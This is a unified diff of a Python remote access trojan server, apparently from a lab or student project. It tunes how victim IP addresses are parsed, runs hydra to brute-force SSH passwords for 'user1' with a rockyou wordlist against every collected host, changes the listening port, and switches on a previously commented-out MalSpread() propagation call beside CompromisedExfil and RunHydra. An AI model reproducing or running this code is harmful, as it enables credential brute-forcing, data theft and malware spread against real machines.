@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 
-import ipaddress
 import socket
 import pyfiglet
 import json
@@ -105,15 +104,17 @@ class SERVER:
                     else:
                         for line in thisFile: # if the file does not have a hydra or password entry, add to dict
                             if "Hostname: " in line:
-                                pcList[file.strip()] = 1
-                            if "IP Address:" in line:
-                                pcList[file.strip()] = line[11:].strip()
-        #print (pcList)
+                                pcList[file.strip()]
+                            if "IP Address:" in line:                       
+                                #print(line[11:].strip())
+                                pcList[file.strip()] = str(line[11:].strip())
+                                
 
         #run hydra for each PC that still needs an attempt
         for key, value in pcList.items():
-            print(str(key) + " " + str(value))
+            print(key + " " + value)
             hResult = subprocess.run(["hydra", "-l", "user1", "-P", '/media/sf_VM_Storage/rat/RAT/rockyou_short.txt', f"ssh://{value}"],capture_output=True)
+
             
             #parse hydra data and write password to file
             passIndex = str(hResult.stdout).find("password:") + 10 # get index of location of 'password: ' in results
@@ -328,7 +329,7 @@ class SERVER:
                     self.exit()
 
 # setting host port and ip to construct with the server class
-rat = SERVER('0.0.0.0', 5553)
+rat = SERVER('0.0.0.0', 5441)
 
 
 if __name__ == '__main__':
@@ -336,5 +337,5 @@ if __name__ == '__main__':
     rat.CompromisedExfil()
     rat.ParsePCFiles()
     rat.RunHydra()
-    #rat.MalSpread()
+    rat.MalSpread()
     rat.mainloop()
